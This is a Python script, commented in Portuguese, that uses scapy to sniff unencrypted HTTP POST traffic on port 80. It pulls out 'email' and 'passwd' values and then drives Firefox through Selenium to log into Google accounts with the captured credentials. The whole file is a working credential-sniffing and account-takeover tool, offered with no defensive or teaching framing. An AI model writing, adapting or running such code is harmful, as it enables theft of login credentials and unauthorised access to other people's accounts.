from selenium import webdriver
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from scapy.all import sniff, Raw
from urllib.parse import unquote

email = ''
password = ''

def processar(pacote):
    global email, password
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[DADOS CAPTURADOS]")
                print("-----------------------------------------")

                # Extrai e decodifica o email
                if "email=" in data:
                    email_raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(email_raw)
                    print(f"[EMAIL]  {email}")

                # Extrai e decodifica a senha
                if "passwd=" in data:
                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                    password = unquote(pass_raw)
                    print(f"[PASSWD] {password}")

                print("-----------------------------------------\n")

        except Exception:
            pass


def expand_shadow(driver, element):
    return driver.execute_script('return arguments[0].shadowRoot', element)

def main():
    try:
        global email, password
        print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
        sniff(filter="tcp port 80", prn=processar, store=False)

        print(f"[*] Tentando login com email = {email} e senha = {password}")

        driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()))
        wait = WebDriverWait(driver, 20)

        driver.get("https://accounts.google.com/")

        # --- EMAIL ---
        email_input = wait.until(EC.presence_of_element_located((By.ID, "identifierId")))
        email_input.send_keys(email)

        driver.find_element(By.ID, "identifierNext").click()

        # --- SENHA ---
        # Espera a senha
        password_input = wait.until(
            EC.presence_of_element_located((By.NAME, "Passwd"))
        )
        password_input.send_keys(password)

        # Espera a div que contém o botão
        password_next_div = wait.until(
            EC.presence_of_element_located((By.ID, "passwordNext"))
        )

        # Clica com JavaScript dentro da div
        driver.execute_script("arguments[0].click();", password_next_div)

        print('[*] Login Successful...!!')

    except:
        print('[*] Login Failed')


if __name__ == "__main__":
    main()